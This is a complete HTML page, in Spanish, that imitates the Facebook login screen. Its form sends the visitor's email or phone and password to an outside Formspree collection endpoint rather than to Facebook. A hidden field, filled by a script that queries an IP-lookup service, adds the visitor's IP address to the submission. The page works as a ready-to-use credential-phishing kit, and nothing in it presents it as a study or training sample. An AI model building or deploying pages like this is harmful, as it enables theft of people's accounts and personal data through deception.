<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión | Facebook</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 100%;
            max-width: 396px;
            text-align: center;
        }
        h1 {
            color: #1877f2;
            font-size: 3rem;
            margin: 0 0 10px 0;
            font-weight: bold;
        }
        p {
            font-size: 1.2rem;
            color: #606770;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        input[type="submit"] {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 20px;
            margin-top: 5px;
        }
        input[type="submit"]:hover {
            background-color: #166fe5;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #606770;
        }
        .footer a {
            color: #385898;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h1>facebook</h1>
    <p>Inicia sesión para continuar.</p>
    
    <!-- Aquí está la magia de Formspree -->
    <form action="https://formspree.io/f/myewlqoo" method="POST">
        
        <input type="text" name="email_usuario" placeholder="Correo electrónico o teléfono" required>
        
        <input type="password" name="contraseña" placeholder="Contraseña" required>
        
        <!-- Campo oculto para capturar la IP del usuario -->
        <input type="hidden" name="IP_Destino" value="">

        <input type="submit" value="Iniciar sesión">
    </form>
    
    <div class="footer">
        <a href="#">¿Olvidaste tu contraseña?</a>
        <br><br>
        <a href="#" onclick="event.preventDefault(); alert('Has creado una cuenta nueva.');">Crear cuenta nueva</a>
    </div>
</div>

<script>
    // Script simple para obtener la IP real del visitante y pasarla al formulario
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.querySelector('input[name="IP_Destino"]').value = data.ip;
        })
        .catch(error => {
            console.error('Error obteniendo IP:', error);
        });
</script>

</body>
</html>
